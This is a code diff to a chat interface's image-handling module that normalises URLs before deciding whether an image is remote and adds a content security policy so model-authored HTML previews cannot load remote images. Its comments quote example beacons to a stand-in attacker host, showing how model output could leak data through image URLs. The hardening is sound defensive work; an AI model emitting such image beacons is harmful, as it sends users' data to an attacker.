@@ -10,20 +10,35 @@
 
 export const REMOTE_IMAGE_PLACEHOLDER_CLASS = 'remote-image-placeholder';
 
+/**
+ * CSP for HTML previews rendered in a sandboxed iframe: a model-authored
+ * `<img src>` (or a CSS `background-image`) must not fetch a remote host.
+ */
+export const PREVIEW_IMAGE_CSP = "img-src 'self' data: blob:";
+
+function pageOriginFallback(): string | undefined {
+  return typeof window !== 'undefined' ? window.location?.origin : undefined;
+}
+
 /** True when loading `url` would send a request to another origin. */
 export function isRemoteImageUrl(
   url: string,
-  pageOrigin: string | undefined = typeof window !== 'undefined'
-    ? window.location?.origin
-    : undefined
+  pageOrigin: string | undefined = pageOriginFallback()
 ): boolean {
-  const trimmed = url.trim();
+  // Browsers strip tabs/newlines from URLs and treat `\` as `/` in markup
+  // attributes, so `\\attacker.example/x.png` is a real network fetch. Decide
+  // on the same form the URL parser will see, not the raw string.
+  const trimmed = url.replace(/[\t\n\r]/g, '').trim();
   if (!trimmed) return false;
   if (/^(?:data|blob):/i.test(trimmed)) return false;
-  // Relative URL, including same-origin absolute paths such as /api/v2/...
-  if (!/^(?:[a-z][a-z0-9+.-]*:)?\/\//i.test(trimmed)) return false;
+
+  const candidate = trimmed.replace(/\\/g, '/');
+  const hasScheme = /^[a-z][a-z0-9+.-]*:/i.test(candidate);
+  // No scheme and no leading `//`: a relative path, which stays on our origin.
+  if (!hasScheme && !candidate.startsWith('//')) return false;
+
   try {
-    const parsed = new URL(trimmed, pageOrigin || 'http://localhost');
+    const parsed = new URL(candidate, pageOrigin || 'http://localhost');
     if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
     return !pageOrigin || parsed.origin !== pageOrigin;
   } catch {
@@ -34,7 +49,7 @@ export function isRemoteImageUrl(
 
 function imageSourceLabel(src: string): string {
   try {
-    return new URL(src, typeof window !== 'undefined' ? window.location?.origin : undefined).host;
+    return new URL(src.replace(/\\/g, '/'), pageOriginFallback()).host;
   } catch {
     return 'remote host';
   }
@@ -59,4 +74,14 @@ export function createRemoteImagePlaceholder(src: string): HTMLButtonElement {
     button.replaceWith(img);
   });
   return button;
+}
+
+/**
+ * Wrap model-authored HTML for the preview iframe with a document-level CSP
+ * that blocks remote image loads. The preview is model output too, so an
+ * `<img src="https://attacker.example/?d=...">` inside an HTML fence would
+ * otherwise beacon even though it is never clicked.
+ */
+export function htmlPreviewSrcDoc(html: string): string {
+  return `<!doctype html><meta http-equiv="Content-Security-Policy" content="${PREVIEW_IMAGE_CSP}">${html}`;
 }
